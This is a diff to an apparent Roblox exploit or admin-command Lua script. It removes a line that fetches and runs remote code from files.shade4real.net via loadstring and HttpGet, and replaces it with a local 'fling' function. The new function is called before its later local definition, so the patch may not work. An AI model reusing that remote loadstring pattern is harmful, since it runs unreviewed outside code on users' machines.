@@ -76,7 +76,7 @@ p1.CFrame = game.Players[p2].Character.HumanoidRootPart.CFrame
 		    game.Players.LocalPlayer.Character.Humanoid.Health = 0
     end
 		if cmd == "fling" then
-		    loadstring(game:HttpGet('https://files.shade4real.net/flinger.txt'))()
+		    flingSelf()
     end
 		if cmd == "leave" then
 		    game:Shutdown()
@@ -352,6 +352,18 @@ end)
 if render1 == true then
     game:GetService("RunService"):Set3dRenderingEnabled(false)
     end
+
+local function flingSelf()
+    -- Create a BodyVelocity to apply force
+    local bv = Instance.new("BodyVelocity")
+    bv.Velocity = Vector3.new(0, 200, 0) + (hrp.CFrame.lookVector * 150)
+    bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
+    bv.P = 1e5
+    bv.Parent = hrp
+
+    -- Remove it after a short time
+    game.Debris:AddItem(bv, 0.5)
+end
 
 -------------------------------------------------------------------------------------------------------------------------------------
 
